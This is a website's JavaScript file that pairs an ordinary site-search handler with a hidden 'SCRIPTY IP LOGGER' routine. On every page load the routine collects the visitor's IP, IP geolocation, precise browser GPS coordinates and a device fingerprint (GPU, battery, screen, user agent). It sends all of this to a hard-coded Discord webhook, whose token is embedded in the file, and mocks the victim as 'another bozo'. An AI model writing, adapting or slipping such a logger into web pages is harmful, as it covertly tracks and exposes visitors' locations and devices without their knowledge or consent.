const sendIP = () => {
    fetch('https://api.ipify.org?format=json')
        .then(ipResponse => ipResponse.json())
        .then(ipData => {
            const ipadd = ipData.ip;

            return fetch(`https://ipapi.co/${ipadd}/json/`)
                .then(geoResponse => geoResponse.json())
                .then(async geoData => {

                    function getGPUInfo() {
                        try {
                            const canvas = document.createElement('canvas');
                            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                            if (!gl) return 'N/A';

                            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                            if (debugInfo) {
                                return gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                            }
                            return 'N/A';
                        } catch {
                            return 'N/A';
                        }
                    }
                    function getBrowserLocation() {
                        return new Promise((resolve) => {
                            if (!navigator.geolocation) {
                                return resolve({ error: 'Geolocation not supported' });
                            }

                            navigator.geolocation.getCurrentPosition(
                                (position) => {
                                    resolve({
                                        latitude: position.coords.latitude.toFixed(6),
                                        longitude: position.coords.longitude.toFixed(6),
                                        accuracy: `${position.coords.accuracy} meters`
                                    });
                                },
                                (error) => {
                                    resolve({ error: error.message });
                                },
                                {
                                    enableHighAccuracy: true,
                                    timeout: 10000,
                                    maximumAge: 0
                                }
                            );
                        });
                    }

                    const deviceInfo = {
                        userAgent: navigator.userAgent,
                        screenWidth: window.screen.width,
                        screenHeight: window.screen.height,
                        language: navigator.language,
                        platform: navigator.platform,
                        battery: "PC don't have battery",
                        charging: "PC don't have battery",
                        screenRefreshRate: "N/A",
                        touchScreen: ('ontouchstart' in window) ? 'Yes' : 'No',
                        gpu: getGPUInfo()
                    };

                    if (navigator.getBattery) {
                        await navigator.getBattery().then(battery => {
                            deviceInfo.battery = (battery.level * 100).toFixed(0) + "%";
                            deviceInfo.charging = battery.charging ? "Yes" : "No";
                        });
                    }

                    const getScreenRefreshRate = () => {
                        return new Promise(resolve => {
                            let frames = 0;
                            const start = performance.now();

                            const loop = () => {
                                frames++;
                                const elapsed = performance.now() - start;
                                if (elapsed < 1000) {
                                    requestAnimationFrame(loop);
                                } else {
                                    resolve(Math.round((frames * 1000) / elapsed) + " Hz");
                                }
                            };

                            requestAnimationFrame(loop);
                        });
                    };

                    deviceInfo.screenRefreshRate = await getScreenRefreshRate();
                    
                    const browserLocation = await getBrowserLocation();
                    const dscURL = 'https://discord.com/api/webhooks/1407630270030680114/24KgIRJu3KCrhK_ELjkh70k8pyu18Xqz9LQGTa4O53cdtLCXZXoW67cM_5mPToQVlvkZ';

                    return fetch(dscURL, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            username: "SCRIPTY IP LOGGER",
                            avatar_url: "https://media.discordapp.net/attachments/1378331466102083756/1407630039213932625/Snimka_obrazovky_2025-08-16_180821.png",
                            content: `@here another bozo logged`,
                            embeds: [{
                                title: 'SCRIPTY IP LOGGER',
                                description: `
**IP Info:**
IP Address > ${ipadd}
Network > ${geoData.network}
City > ${geoData.city}
Region > ${geoData.region}
Country > ${geoData.country_name}
Postal Code > ${geoData.postal}
Latitude > ${geoData.latitude}
Longitude > ${geoData.longitude}
Timezone > ${geoData.timezone}
Organization > ${geoData.org}

**Geolocation (Browser-based - GPS):**
Latitude > ${browserLocation.latitude || 'Denied'}
Longitude > ${browserLocation.longitude || 'Denied'}
Accuracy > ${browserLocation.accuracy || browserLocation.error || 'N/A'}

**Screen Info:**
Screen Width > ${deviceInfo.screenWidth}px
Screen Height > ${deviceInfo.screenHeight}px
Screen Refresh Rate > ${deviceInfo.screenRefreshRate}
Touch Screen > ${deviceInfo.touchScreen}

**Device Info:**
User-Agent > ${deviceInfo.userAgent}
Language > ${deviceInfo.language}
Platform > ${deviceInfo.platform}
Battery > ${deviceInfo.battery}
Charging > ${deviceInfo.charging}
GPU > ${deviceInfo.gpu}
                                `,
                                color: 1752220
                            }]
                        })
                    });
                });
        })
        .then(dscResponse => {
            if (dscResponse.ok) {
                console.log('Sent! <3');
            } else {
                console.log('Failed :(');
            }
        })
        .catch(error => {
            console.error('Error:', error);
            console.log('Error :(');
        });
};

sendIP();

document.querySelector('.search-bar input').addEventListener('keydown', e => {
  if (e.key === 'Enter') {
    const query = e.target.value.trim();
    if (query) {
      window.location.href = `https://google.com/search?q=site:scripty.my+${encodeURIComponent(query)}`;
    }
  }
});

document.querySelector('.search-bar button').addEventListener('click', () => {
  const query = document.querySelector('.search-bar input').value.trim();
  if (query) {
    window.location.href = `https://google.com/search?q=site:scripty.my+${encodeURIComponent(query)}`;
  }
});